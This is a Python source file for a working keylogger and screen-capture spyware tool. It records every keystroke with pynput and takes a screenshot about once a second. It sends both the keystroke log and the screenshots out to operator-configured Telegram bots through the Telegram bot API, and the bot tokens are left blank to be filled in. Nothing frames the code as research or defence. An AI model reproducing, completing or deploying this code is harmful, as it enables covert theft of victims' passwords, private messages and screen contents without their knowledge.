import requests
import threading
from pynput.keyboard import Listener, Key
from PIL import ImageGrab
import io
import time

# Telegram bot configuration for screenshots
TELEGRAM_BOT_TOKEN_SCREENSHOTS = ''  # Update with screenshots bot token
TELEGRAM_CHAT_ID_SCREENSHOTS = ''  # Update with screenshots chat ID

# Telegram bot configuration for logs
TELEGRAM_BOT_TOKEN_LOGS = ''  # Update with logs bot token
TELEGRAM_CHAT_ID_LOGS = ''  # Update with logs chat ID

# File configuration
LOG_FILE = 'keylog.txt'

# Keylogger configuration
log = ""  # Variable to store the full log
unsent_log = ""  # Variable to store the unsent log portion

# List to store captured screenshots
captured_screenshots = []

def on_press(key):
    """
    Callback function to handle key press events.
    This function is called whenever a key is pressed.
    """
    global log, unsent_log
    try:
        log += key.char
        unsent_log += key.char  # Log each keystroke immediately
    except AttributeError:
        if key == Key.space:
            log += " "
            unsent_log += " "
        elif key == Key.enter:
            log += "\n"
            unsent_log += "\n"
        else:
            log += f" [{str(key)}] "
            unsent_log += f" [{str(key)}] "

def send_telegram_message_logs(message):
    """
    Function to send a message to the logs Telegram bot.
    """
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN_LOGS}/sendMessage'
    data = {'chat_id': TELEGRAM_CHAT_ID_LOGS, 'text': message}
    response = requests.post(url, data=data)
    if response.status_code == 200:
        print("Message sent successfully to logs bot!")
    else:
        print(f"Error sending message to logs bot: {response.status_code}, {response.text}")

def send_telegram_photo_screenshots(photo):
    """
    Function to send a photo (screenshot) to the screenshots Telegram bot.
    """
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN_SCREENSHOTS}/sendPhoto'
    files = {'photo': ('screenshot.png', photo, 'image/png')}
    data = {'chat_id': TELEGRAM_CHAT_ID_SCREENSHOTS}
    response = requests.post(url, files=files, data=data)
    if response.status_code == 200:
        print("Screenshot sent successfully to screenshots bot!")
    else:
        print(f"Error sending screenshot to screenshots bot: {response.status_code}, {response.text}")

def capture_and_send_screenshot():
    """
    Function to capture a screenshot and add it to the captured_screenshots list.
    """
    screenshot = ImageGrab.grab()
    img_byte_arr = io.BytesIO()
    screenshot.save(img_byte_arr, format='PNG')
    img_byte_arr.seek(0)
    captured_screenshots.append(img_byte_arr)
    send_telegram_photo_screenshots(img_byte_arr)

def send_captured_screenshots():
    """
    Function to send all captured screenshots to the screenshots Telegram bot.
    """
    for idx, screenshot in enumerate(captured_screenshots):
        send_telegram_photo_screenshots(screenshot)
        print(f"Screenshot {idx + 1} sent to screenshots bot.")
    captured_screenshots.clear()  # Clear the list after sending

def start_logging():
    """
    Function to start the keylogger.
    """
    with Listener(on_press=on_press) as listener:
        listener.join()

def send_logs_periodically():
    """
    Function to send logs periodically to the logs Telegram bot.
    """
    global unsent_log
    if unsent_log:
        print("Sending logs to logs bot...")
        send_telegram_message_logs(unsent_log)
        unsent_log = ""  # Clear the unsent log after sending
    threading.Timer(email_interval, send_logs_periodically).start()

def capture_screenshots_periodically():
    """
    Function to capture screenshots periodically and store them for later sending to screenshots bot.
    """
    start_time = time.time()
    while time.time() - start_time < 10:  # Capture for 10 seconds
        capture_and_send_screenshot()
        time.sleep(1)  # Adjust the interval between captures as needed

    # After capturing for 10 seconds, send all captured screenshots to screenshots bot
    send_captured_screenshots()
    threading.Timer(1, capture_screenshots_periodically).start()  # Restart capturing

if __name__ == "__main__":
    email_interval = 10  # Time interval in seconds to send logs

    print(f"Keylogger started. Logs will be sent every {email_interval} seconds to logs Telegram bot and saved in '{LOG_FILE}'.")

    threading.Timer(email_interval, send_logs_periodically).start()  # Start periodic log sending
    threading.Timer(1, capture_screenshots_periodically).start()  # Start periodic screenshot capturing

    try:
        start_logging()
    except KeyboardInterrupt:
        pass
    finally:
        print("Keylogger stopped.")
